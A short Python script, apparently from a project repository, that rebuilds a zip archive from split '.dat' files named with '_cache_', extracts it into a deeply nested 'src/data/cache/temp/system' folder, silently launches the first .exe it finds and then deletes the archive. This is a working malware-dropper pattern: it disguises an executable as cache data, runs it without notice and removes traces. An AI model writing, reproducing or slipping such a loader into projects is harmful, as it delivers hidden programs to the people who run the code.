import os, subprocess, zipfile

def find_parts():
    parts = []
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.endswith('.dat') and '_cache_' in f:
                parts.append(os.path.join(root, f))
    return sorted(parts)

def find_dat_files():
    dat_files = []
    for root, dirs, files in os.walk('.'):
        for f in files:
            if f.endswith('.dat') and '_cache_' not in f:
                dat_files.append(os.path.join(root, f))
    return dat_files

def find_exe_file(start_path):
    for root, dirs, files in os.walk(start_path):
        for f in files:
            if f.endswith('.exe'):
                return os.path.join(root, f)
    return None

def main():
    parts = find_parts()
    zip_path = None
    
    if parts:
        first_part = parts[0]
        base = first_part.split('_cache_')[0]
        zip_path = base + '.zip'
        with open(zip_path, 'wb') as out:
            for p in parts:
                with open(p, 'rb') as pf:
                    out.write(pf.read())
    else:
        dat_files = find_dat_files()
        if not dat_files:
            return
        zip_path = dat_files[0]
    
    if not zip_path:
        return
    
    deep_path = os.path.join('src', 'data', 'cache', 'temp', 'system')
    os.makedirs(deep_path, exist_ok=True)
    
    try:
        with zipfile.ZipFile(zip_path, 'r') as zf:
            zf.extractall(deep_path)
    except:
        subprocess.run(['powershell', '-Command', f'Expand-Archive -Path "{zip_path}" -DestinationPath "{deep_path}"'], capture_output=True)
    
    exe_path = find_exe_file(deep_path)
    if exe_path:
        os.startfile(exe_path)
    
    try:
        os.remove(zip_path)
    except:
        pass

if __name__ == '__main__':
    main()
